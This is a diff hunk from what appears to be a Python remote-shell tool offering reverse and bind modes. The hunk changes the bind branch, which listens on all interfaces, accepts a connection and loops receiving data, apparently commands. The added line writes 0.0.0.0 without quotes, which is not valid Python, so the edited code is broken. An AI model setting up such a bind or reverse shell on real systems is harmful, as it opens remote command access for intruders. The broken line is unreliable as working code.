@@ -47,7 +47,7 @@ if args.method == 'rev':
 
 elif args.method == 'bind':
     s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
-    s.bind((args.ip,args.port))
+    s.bind((0.0.0.0,args.port))
     s.listen(1);c,a=s.accept()
     while True:
         d=c.recv(1024).decode();
